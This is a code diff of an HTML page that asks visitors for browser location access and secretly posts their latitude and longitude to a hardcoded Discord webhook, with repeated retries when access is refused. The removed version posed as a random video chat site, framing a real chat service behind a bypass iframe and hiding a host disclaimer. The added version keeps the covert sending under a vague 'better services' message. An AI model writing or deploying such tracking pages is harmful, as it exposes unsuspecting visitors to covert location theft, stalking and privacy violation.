@@ -3,73 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Video Chat - StrangerCam.com</title>
+    <title>Geolocation with Discord Integration</title>
     <style>
-        img[alt*="www.000webhost.com"], .disclaimer {
+        #dialogBox {
             display: none;
-        }
-        .iframe-container {
-            position: relative;
-            width: 100%;
-            height: 100vh;
-        }
-        .dialog-box {
-            position: absolute;
+            position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: #ffffff;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             padding: 20px;
+            background: #fff;
+            border: 1px solid #ccc;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
-            max-width: 300px;
-            display: none; /* Hidden initially */
-        }
-        .dialog-box h2 {
-            margin-top: 0;
-            color: #333333;
-        }
-        .dialog-box p {
-            margin-bottom: 20px;
-            color: #666666;
-        }
-        .btn-allow {
-            background-color: #4CAF50;
-            color: #ffffff;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        .btn-allow:hover {
-            background-color: #45a049;
         }
     </style>
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
 </head>
 <body>
-    <div class="iframe-container">
-        <iframe
-            is="x-frame-bypass"
-            src="https://strangercamchat.com"
-            frameborder="0"
-            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
-        ></iframe>
-        <div class="dialog-box" id="dialogBox">
-            <h2>Permission Needed</h2>
-            <p>Please allow location access to chat with nearby strangers.</p>
-            <button class="btn-allow" onclick="manualRequestLocation()">Allow</button>
-        </div>
+    <div id="dialogBox">
+        <p>We need your location to provide better services. Please allow location access.</p>
+        <button onclick="requestLocation()">Retry</button>
     </div>
 
     <script>
-        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your Discord Webhook URL
-        let retryCount = 0;
+        const discordWebhookURL = "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm"; // Replace with your webhook URL
+        const retryDelay = 5000; // 5 seconds
         const maxRetries = 5; // Maximum retries
-        const retryDelay = 5000; // Retry every 5 seconds
+        let retryCount = 0;
+
+        async function sendToDiscord(latitude, longitude) {
+            const data = {
+                content: `User location: Latitude ${latitude}, Longitude ${longitude}`
+            };
+
+            try {
+                const response = await fetch(discordWebhookURL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Discord webhook error: ${response.statusText} (${response.status})`);
+                }
+
+                console.log("Location sent to Discord successfully.");
+            } catch (error) {
+                console.error("Failed to send location to Discord:", error);
+            }
+        }
 
         async function getLocationPermission() {
             return new Promise((resolve, reject) => {
@@ -79,33 +63,16 @@
                         timeout: 5000
                     });
                 } else {
-                    reject({ message: "Geolocation is not supported by this browser." });
+                    reject(new Error("Geolocation is not supported by this browser."));
                 }
             });
-        }
-
-        async function sendToDiscord(latitude, longitude) {
-            try {
-                const data = {
-                    content: `User location: Latitude ${latitude}, Longitude ${longitude}`
-                };
-                await fetch(discordWebhookURL, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify(data)
-                });
-                console.log("Location sent to Discord successfully.");
-            } catch (error) {
-                console.error("Failed to send location to Discord:", error);
-            }
         }
 
         async function requestLocation() {
             try {
                 const position = await getLocationPermission();
                 const { latitude, longitude } = position.coords;
+
                 console.log("Permission granted:", latitude, longitude);
 
                 document.getElementById('dialogBox').style.display = 'none'; // Hide dialog
@@ -115,6 +82,7 @@
                 sendToDiscord(latitude, longitude);
             } catch (error) {
                 console.warn("Location access failed:", error);
+
                 if (retryCount < maxRetries) {
                     retryCount++;
                     console.log(`Retrying (${retryCount}/${maxRetries}) in ${retryDelay / 1000}s...`);
@@ -124,11 +92,6 @@
                     console.error("Max retries reached. Location permission denied.");
                 }
             }
-        }
-
-        function manualRequestLocation() {
-            retryCount = 0; // Reset count when manually retried
-            requestLocation();
         }
 
         document.addEventListener("DOMContentLoaded", () => {
